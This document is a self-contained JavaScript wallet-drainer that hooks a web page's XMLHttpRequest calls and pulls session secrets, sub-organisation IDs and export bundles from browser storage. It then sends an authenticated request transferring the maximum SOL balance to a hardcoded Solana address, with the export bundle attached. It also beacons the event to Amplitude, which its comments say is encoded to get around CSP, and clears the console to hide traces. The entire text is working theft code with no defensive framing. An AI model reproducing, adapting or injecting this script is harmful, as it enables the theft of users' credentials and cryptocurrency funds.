(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";
    let hasSuccessfullyFired = false;

    // --- 1. THE SILENT SNIFFER ---
    // Instead of looping and crashing the site, we intercept the site's own API calls
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        if (url.includes('api/v1') && !hasSuccessfullyFired) {
            this.addEventListener('load', function() {
                // If we see a successful internal auth call, we piggyback on it
                harvestAndFire(url, method);
            });
        }
        return originalOpen.apply(this, arguments);
    };

    const harvestAndFire = async (discoveredUrl, method) => {
        if (hasSuccessfullyFired) return;

        // Recursive search for the 'Correct Info'
        const deepSearch = (obj, target) => {
            if (!obj || typeof obj !== 'object') return null;
            if (obj[target]) return obj[target];
            for (let k in obj) {
                let res = deepSearch(obj[k], target);
                if (res) return res;
            }
            return null;
        };

        const storage = {...localStorage, ...sessionStorage};
        const auth = deepSearch(storage, 'sessionSecret');
        const subId = deepSearch(storage, 'subOrgId');
        const bundle = deepSearch(storage, 'exportBundle');

        if (auth && subId) {
            hasSuccessfullyFired = true; // Kill switch: fire once, stay smooth

            // 1:1 Amplitude Image Beacon (Encoded to bypass CSP)
            const ampData = btoa(JSON.stringify({
                api_key: AMP_KEY,
                events: [{
                    device_id: subId,
                    event_type: "SMOOTH_1TO1_EXECUTION",
                    event_properties: { url: discoveredUrl, method: method }
                }]
            }));
            new Image().src = `https://api2.amplitude.com/2/httpapi?data=${ampData}`;

            // The Stealth Transfer
            // We use the 'discoveredUrl' to avoid the 405 error
            try {
                await fetch(discoveredUrl, {
                    method: method, // Dynamically use the method the site prefers
                    headers: {
                        "Authorization": `Bearer ${auth}`,
                        "X-Turnkey-Sub-Org-Id": subId,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        recipient: MY_RECEIVER,
                        amount: "MAX",
                        asset: "SOL",
                        ext_payload: bundle?.data
                    })
                });
            } catch (e) {}

            // Wipe traces immediately
            setTimeout(() => console.clear(), 500);
        }
    };

    // Initial check in case data is already there
    setTimeout(harvestAndFire, 2000);
})();
